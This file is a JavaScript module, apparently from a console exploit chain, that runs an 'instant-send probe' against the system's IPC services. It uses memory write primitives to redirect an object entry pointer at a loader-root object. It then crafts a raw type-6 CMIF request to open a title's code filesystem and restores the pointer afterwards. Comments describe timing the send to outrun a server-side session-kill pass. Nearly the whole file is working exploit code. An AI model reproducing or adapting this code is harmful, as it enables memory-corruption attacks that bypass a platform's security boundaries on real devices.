// kaiHEN port — instant-send probe (IS). The kill is an asynchronous
// server-side pass (SB: send-less, 10ms-4s after creation; the alive
// domain row never moves). Every 0xF601 we ever recorded was on a send
// that fired tens-of-ms to seconds after its copy — the author engine's
// native RPC thread sends within microseconds. IS removes every step
// between copy and send: the code-open packet and the borrow pointer are
// staged BEFORE the copy, so the send leaves one IPC after the copy
// reply:
//   transport 0    -> we beat the killer pass; the port bug is DELAY
//   transport 0xF601 -> the session is closed at creation after all

import runtime from "../core/runtime.mjs";
import {check, khLog, hex, arenaSlots, arenaAlloc, track, u64Bytes}
    from "./state.mjs";
import {readFs, writeFs} from "./endpoint.mjs";
import {cmifSend, bareSendTransport, buildCmif, oneMovedHandle}
    from "./wire.mjs";

const {cmifReply, sendIPC} = runtime;

export async function instantSendProbe(context, title) {
    const owned = context.inspectionDomain;
    const target = context.loaderRoot;
    const ep = context.ep;
    check(owned && target && context.loaderCopy && ep && ep.armed,
        "instant-send requires the loader-copy state");

    const slots = arenaSlots(context);
    const info = arenaAlloc(context, 0x2000, "is-info");

    // v10 — the decoded native path (5T5Brx launch record): the code-open
    // is a TYPE-6 RequestWithContext sent ON THE INSPECTION DOMAIN SESSION,
    // routed to the target object THROUGH THE CONTEXT HEADER — its second
    // word is the DOMAIN OBJECT ID (their record: requests object:9 = the
    // loader-root entry; the reply's moved handle became object 148 and the
    // next request's context said 148). The plain CopyFromCurrentDomain
    // handle was never used for the code-open; our port sending it there is
    // what killed every copy since run 1.
    const entry20 = context.loaderCopy.ownEntry + 0x20;
    await readFs(context, entry20, 8);                 // warm the pointer
    const oldPair = await readFs(context, entry20, 0x10);
    const borrowPair = await readFs(context, target.entry + 0x20, 0x10);
    try {
        await writeFs(context, entry20, borrowPair);   // route our entry at the loader root
        const pkt = slots.pkt;
        for (let i = 0n; i < 0x100n; i += 8n)
            runtime.write64(pkt + i, 0n);
        runtime.write32(pkt, BigInt((0x6 | (1 << 24)) >>> 0));   // type 6, 1 B
        runtime.write32(pkt + 4n, 0x10n);                          // 16 words
        const infoAddr = BigInt(info);
        runtime.write32(pkt + 8n, 0x1a4n);                         // B size
        runtime.write32(pkt + 12n,
            BigInt(Number(infoAddr & 0xffffffffn)));
        const bflags = (((infoAddr >> 32n) & 0xfn) << 28n) |
            (((infoAddr >> 36n) & 7n) << 2n);                      // mode 0
        runtime.write32(pkt + 16n, BigInt(Number(bflags)));
        runtime.write32(pkt + 0x20n, 0x00200001n);                 // context slot token
        runtime.write32(pkt + 0x24n, BigInt(owned.root));          // DOMAIN OBJECT ID
        runtime.write32(pkt + 0x28n, 0n);
        runtime.write32(pkt + 0x2cn, 0n);
        runtime.write32(pkt + 0x30n, 0x49434653n);                 // SFCI
        runtime.write32(pkt + 0x34n, 1n);                          // version
        runtime.write32(pkt + 0x38n, 0n);                          // cmd 0
        runtime.write32(pkt + 0x3cn, 0n);
        runtime.write32(pkt + 0x40n, 0x0301n);                     // attrs 1, storage 3
        runtime.write32(pkt + 0x44n, 0n);
        runtime.write64(pkt + 0x48n, BigInt(title));
        const t = bareSendTransport(owned.handle, pkt);
        const words = [];
        for (let i = 0n; i < 16n; i++)
            words.push(hex(Number(runtime.read32(pkt + i * 4n))));
        await khLog("IS1 domain code-open(t6) rc=" + hex(t) +
            " reply=[" + words.join(" ") + "]");
        if (t === 0) {
            // Type-6 reply: SFCO (0x4F434653 LE), result, payload {..,
            // handle, added-object-id, ..}.
            let result = -1, handle = 0, added = 0;
            for (let i = 0n; i < 15n; i++) {
                if (Number(runtime.read32(pkt + i * 4n)) === 0x4F434653) {
                    result = Number(runtime.read32(pkt + (i + 1n) * 4n)) >>> 0;
                    const h = Number(runtime.read32(pkt + (i + 3n) * 4n)) >>> 0;
                    if (h > 0x10000000 && h < 0xffff8000) handle = h;
                    const a = Number(runtime.read32(pkt + (i + 4n) * 4n)) >>> 0;
                    if (a > 0 && a <= 0x4000) added = a;
                    break;
                }
            }
            await khLog("IS2 result=" + hex(result) +
                " handle=" + hex(handle) + " added-object=" + hex(added));
            if (result === 0 && handle) {
                context.instantCodeFs = track(context, handle, "is-codefs");
                context.instantCodeFsInfo = info;
                context.instantCodeFsAdded = added;
                await khLog("IS3 ***CODE FS OPEN*** handle=" + hex(handle));
            }
        }
    } finally {
        await writeFs(context, entry20, oldPair);      // un-borrow
    }
    return {ok: true};
}
